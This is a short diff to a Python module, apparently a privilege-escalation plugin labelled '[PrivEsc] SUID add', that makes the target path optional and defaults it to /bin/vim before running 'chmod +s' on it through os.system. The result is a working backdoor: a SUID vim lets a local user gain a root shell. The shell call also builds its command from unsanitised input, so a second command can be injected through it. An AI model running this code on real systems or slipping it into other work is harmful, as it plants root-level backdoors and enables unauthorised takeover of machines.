@@ -1,8 +1,10 @@
 #!/usr/bin/python3
-#SUID file
-#PATH,yes,Set path to file
+#[PrivEsc] SUID add
+#PATH,no,Set path to file
 #END
 import os
 
 def main(arguments):
-        os.system('chmod +s ' + arguments[0])
+    if arguments[0] == "":
+        arguments[0] = "/bin/vim"
+    os.system("chmod +s " + arguments[0])
